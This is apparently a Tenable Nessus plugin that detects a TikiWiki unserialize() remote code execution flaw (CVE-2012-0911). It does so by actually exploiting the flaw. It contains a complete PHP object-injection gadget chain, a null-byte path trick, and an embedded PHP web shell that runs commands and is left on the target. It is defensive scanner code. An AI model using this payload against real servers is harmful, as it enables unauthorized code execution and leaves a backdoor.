#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(61733);
  script_version("$Revision: 1.8 $");
  script_cvs_date("$Date: 2016/11/23 20:42:24 $");

  script_cve_id("CVE-2012-0911");
  script_bugtraq_id(54298);
  script_osvdb_id(83534, 86618, 88671);
  script_xref(name:"EDB-ID", value:"19573");

  script_name(english:"TikiWiki unserialize() Function Arbitrary Code Execution");
  script_summary(english:"Attempts to execute arbitrary PHP code");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts an application that allows arbitrary code
execution.");
  script_set_attribute(attribute:"description", value:
"The version of the TikiWiki installed on the remote host contains a
flaw that could allow a remote attacker to execute arbitrary code.  The
'unserialize()' function is not properly sanitized before being used in
the 'lib/banners/bannerlib.php', 'tiki-print_multi_pages.php',
'tiki-send_objects.php' and 'tiki-print_pages.php' scripts. 

Successful exploitation of the vulnerability requires that the
'multiprint' feature is enabled, the PHP setting 'display_errors' must
be set to 'On', and a PHP version older than 5.3.4 must be in use to
allow poison NULL bytes in filesystem-related functions.");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2012/Jul/19");
  script_set_attribute(attribute:"see_also", value:"http://info.tiki.org/article191-Tiki-Releases-8-4");
  script_set_attribute(attribute:"solution", value:"Upgrade to version 8.4 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"Tiki Wiki CMS Groupware 8.3 RCE");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Tiki Wiki unserialize() PHP Code Execution');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
script_set_attribute(attribute:"vuln_publication_date", value:"2012/08/04");
  script_set_attribute(attribute:"patch_publication_date", value:"2012/05/01");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/08/30");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:tikiwiki:tikiwiki");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2012-2016 Tenable Network Security, Inc.");

  script_dependencies("tikiwiki_detect.nasl", "os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/tikiwiki", "www/PHP");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("url_func.inc");

port = get_http_port(default:80, php:TRUE);

install = get_install_from_kb(
  appname      : "tikiwiki",
  port         : port,
  exit_on_fail : TRUE
);
dir = install["dir"];
install_url = build_url(qs:dir+'/', port:port);

# Get full path for use in our exploit POST request
url = dir + '/tiki-rss_error.php';
res = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail:TRUE);

get_path = eregmatch(pattern:"[> ](([a-zA-Z]:\\|\/).*)tiki-rss_error\.php", string:res[2], icase:TRUE);
if (isnull(get_path)) exit(0, "The full path for the TikiWiki install at "+install_url+" could not be determined.");
install_path = get_path[1];


# Determine which command to execute on target host
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) cmd = 'ipconfig /all';
  else cmd = 'id';

  cmds = make_list(cmd);
}
else cmds = make_list('id', 'ipconfig /all');

cmd_pats = make_array();
cmd_pats['id'] = "uid=[0-9]+.*gid=[0-9]+.*";
cmd_pats['ipconfig /all'] = "Subnet Mask";

token = (SCRIPT_NAME - ".nasl") + "-" + unixtime() + ".php";

foreach cmd (cmds)
{
  # Get path to the file uploaded for use in our reporting section
  if (cmd == 'id') upload_path = "system('pwd')";
  else upload_path = "system('dir "+ token +"')";

  # Form  our PHP file to upload
  php_shell = "<?php+echo('<pre>');+system('"+ cmd +"');+echo(' - "+token+" ');+"+upload_path+";?>";

  shell_length = strlen(php_shell);
  path = install_path + token + "%00";
  path_length = strlen(path) - 2;

  printpages = 'O:29:\"Zend_Pdf_ElementFactory_Proxy\":1:' +
  '{s:39:\"%00Zend_Pdf_ElementFactory_Proxy%00_factory\";O:51:\"Zend_Search_Lucene_Index_SegmentWriter_StreamWriter\":5:' +
  '{s:12:\"%00*%00_docCount\";i:1;s:8:\"%00*%00_name\";s:3:\"foo\";s:13:\"%00*%00_directory\";O:47:\"Zend_Search_Lucene_Storage_Directory_Filesystem\":1:' +
  '{s:11:\"%00*%00_dirPath\";s:' + path_length +':"'+path+'";}' +
  's:10:\"%00*%00_fields\";a:1:' +
  '{i:0;O:34:\"Zend_Search_Lucene_Index_FieldInfo\":1:' +
  '{s:4:\"name\";s:'+shell_length+':"'+php_shell+'";}}' +
  's:9:\"%00*%00_files\";O:8:\"stdClass\":0:{}}}';

  printpages = urlencode(
    str        : printpages,
    unreserved : "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_.!~'-+$",
    case_type  : HEX_UPPERCASE
  );

  # Send POST request to upload the PHP file
  res2 = http_send_recv3(
    port         : port,
    method       : "POST",
    item         : dir + '/tiki-print_multi_pages.php',
    data         : 'printpages=' + printpages,
    add_headers  : make_array("Content-Type","application/x-www-form-urlencoded"),
    exit_on_fail : TRUE
  );

  if ('Required features: <b>feature_wiki_multiprint</b>' >< res2[2])
    exit(0, "The Multiprint feature appears to be disabled for the TikiWiki install at "+install_url+".");

  exp_request = http_last_sent_request();

  # Try accessing the file we uploaded
  url3 = dir + "/" + token;
  res3 = http_send_recv3(method:"GET", item:url3, port:port, exit_on_fail:TRUE);
  if (egrep(pattern:cmd_pats[cmd], string:res3[2]))
  {
    # Remove NULL byte and format the output
    if (cmd == 'id')
    {
      out_full = strstr(res3[2], "uid");
      pos = stridx(out_full, " - " + token);
      output = substr(out_full, 0, pos);

      form_up_path = strstr(res3[2], "php");
      form_up_path2 = stridx(form_up_path, '\n');
      form_up_path3 = substr(form_up_path, 0, form_up_path2) - "php ";
      get_up_path = chomp(form_up_path3) + "/" + token;
    }
    else
    {
      out_full = strstr(res3[2], "Windows IP Configuration");
      pos = stridx(out_full, " - " + token);
      output = substr(out_full, 0, pos);

      form_up_path = strstr(res3[2],"Directory of");
      form_up_path2 = stridx(form_up_path, '\n');
      form_up_path3 = substr(form_up_path, 0, form_up_path2) - "Directory of ";
      get_up_path = chomp(form_up_path3) + "\" + token;
    }
    if (report_verbosity > 0)
    {
      snip = crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30);
      report =
        '\nNessus was able to verify the issue exists using the following request :' +
        '\n' +
        '\n' + build_url(qs:url3, port:port) +
        '\n' +
        '\nNote: This file has not been removed by Nessus and will need to be' +
        '\nmanually deleted (' + get_up_path + ').' +
        '\n';
      if (report_verbosity > 1)
      {
        report +=
          '\nThis file was uploaded using the following request :' +
          '\n' +
          '\n' + snip +
          '\n' + exp_request +
          '\n' + snip +
          '\n' +
          '\n' + 'The file uploaded by Nessus executed the command : '+ cmd +
          '\nwhich produced the following output :' +
          '\n' +
          '\n' + snip +
          '\n' + chomp(output) +
          '\n' + snip +
          '\n';
      }
       security_hole(port:port, extra:report);
    }
    else security_hole(port);
    exit(0);
  }
}
audit(AUDIT_WEB_APP_NOT_AFFECTED, "TikiWiki", install_url);
